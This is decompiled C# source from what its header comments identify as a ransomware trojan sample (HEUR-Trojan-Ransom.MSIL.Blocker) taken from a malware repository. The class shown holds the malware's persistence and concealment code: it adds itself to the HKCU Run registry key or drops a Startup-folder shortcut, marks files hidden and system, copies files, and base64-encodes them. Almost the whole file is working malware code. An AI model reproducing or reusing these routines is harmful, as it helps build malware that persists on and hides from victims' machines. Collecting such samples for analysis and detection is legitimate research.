// Decompiled with JetBrains decompiler
// Type: flu.File
// Assembly: flu-nucleo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1FFD10A3-F795-4E6C-98F1-531878AC8FB2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b0697b8bc5c1f3bc7f21ce5b4482619e916e2da4.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;

namespace flu
{
  internal class File
  {
    public const string rutaRegistroEjecutableFlu = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    private string path;

    public File(string filename) => this.path = filename;

    public bool existKey(string rKey)
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      foreach (string valueName in registryKey.GetValueNames())
      {
        if (valueName.Equals(rKey))
          return true;
      }
      registryKey.Close();
      return false;
    }

    public string getKeyValue(string rKey)
    {
      string empty = string.Empty;
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      foreach (string valueName in registryKey.GetValueNames())
      {
        if (valueName.Equals(rKey))
        {
          try
          {
            empty = registryKey.GetValue(valueName).ToString();
            break;
          }
          catch
          {
            break;
          }
        }
      }
      registryKey.Close();
      return empty;
    }

    public void Register(File.RunLocation where)
    {
      if (where == File.RunLocation.InRegistry)
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        registryKey.SetValue("win32", (object) this.path);
        registryKey.Close();
      }
      else
      {
        using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Path.GetRandomFileName() + ".url"))
        {
          string location = Assembly.GetExecutingAssembly().Location;
          streamWriter.WriteLine("[InternetShortcut]");
          streamWriter.WriteLine("URL=file:///" + this.path);
          streamWriter.WriteLine("IconIndex=0");
          string str = location.Replace('\\', '/');
          streamWriter.WriteLine("IconFile=" + str);
          streamWriter.Flush();
        }
      }
    }

    public void CopyTo(string newFilename)
    {
      try
      {
        System.IO.File.Copy(this.path, newFilename, true);
      }
      catch
      {
      }
    }

    public void Protect()
    {
      try
      {
        FileInfo fileInfo = new FileInfo(this.path);
        fileInfo.Attributes = fileInfo.Attributes | FileAttributes.Hidden | FileAttributes.System;
      }
      catch
      {
      }
    }

    public static string ToBase64(string path)
    {
      FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read);
      byte[] numArray = new byte[fileStream.Length];
      fileStream.Read(numArray, 0, Convert.ToInt32(fileStream.Length));
      return Convert.ToBase64String(numArray, Base64FormattingOptions.InsertLineBreaks);
    }

    public enum RunLocation
    {
      InRegistry,
      InStartup,
    }
  }
}
